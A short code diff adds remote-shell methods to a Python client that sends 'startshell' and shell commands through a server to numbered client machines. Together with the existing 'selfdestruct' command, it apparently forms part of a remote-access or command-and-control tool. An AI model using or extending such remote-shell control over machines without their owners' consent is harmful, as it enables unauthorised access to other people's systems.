@@ -65,6 +65,34 @@ class Client:
         self.server.send(command.encode('utf-8'))
         time.sleep(0.5)
         self.server.recv(1024)
+
+
+    def start_shell(self, shelladdr):
+        #if desired addr = client addr
+            command = 'startshell'
+            self.server.send(command.encode('utf-8'))
+            time.sleep(2)
+            command = f'{shelladdr}'
+            self.server.send(command.encode('utf-8'))
+            print(f'Connecting to client #{shelladdr}')
+            response = self.server.recv(1024).decode('utf-8')
+            if response == 'connected':
+                print(f'Connected to {shelladdr}')
+            else:
+                print('Could not connect to client')
+            
+
+    def send_shell_command(self, command):
+        command = command
+        self.server.send(command.encode('utf-8'))
+        return True
+    
+    def recieve_shell_response(self):
+        recieved = self.server.recv(1024).decode('utf-8')
+        return recieved
+
+    def stop_shell(self):
+        pass
         
     def destroy(self):
         command = 'selfdestruct'
